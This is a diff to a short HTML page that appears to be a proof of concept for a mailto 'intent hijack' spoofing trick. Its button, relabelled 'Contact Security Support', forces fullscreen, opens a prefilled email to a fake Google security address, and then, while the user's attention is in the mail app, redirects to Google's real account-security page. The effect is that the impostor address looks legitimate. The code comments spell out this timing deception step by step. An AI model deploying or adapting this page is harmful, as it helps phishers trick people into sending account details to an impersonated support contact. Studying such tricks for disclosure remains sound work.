@@ -1,17 +1,36 @@
 <!DOCTYPE html>
 <html>
-<body>
+<body style="margin:0;display:flex;align-items:center;justify-content:center;height:100vh;">
 
-<button style="font-size:20px;padding:20px"
-onclick="
-location.href='mailto:securityfake@google.com?subject=Intent%20Hijack';
-
-setTimeout(()=>{
-  location.href='https://example.com/security';
-},1000);
-">
-Continue
+<button id="go" style="font-size:20px;padding:16px;">
+  Contact Security Support
 </button>
+
+<script>
+document.getElementById("go").onclick = async () => {
+
+  // 1. Enter fullscreen (user gesture)
+  if (document.documentElement.requestFullscreen) {
+    try {
+      await document.documentElement.requestFullscreen();
+    } catch (e) {}
+  }
+
+  // 2. Trigger mailto intent (opens Gmail / chooser)
+  setTimeout(() => {
+    location.href =
+      "mailto:securityfake@google.com" +
+      "?subject=Account%20Security%20Issue" +
+      "&body=Hello%20Support,%0A%0A" +
+      "I%20need%20help%20with%20my%20account.%0A%0ARegards";
+  }, 300);
+
+  // 3. Redirect while user focus is in email app
+  setTimeout(() => {
+    location.href = "https://myaccount.google.com/security";
+  }, 900);
+};
+</script>
 
 </body>
 </html>
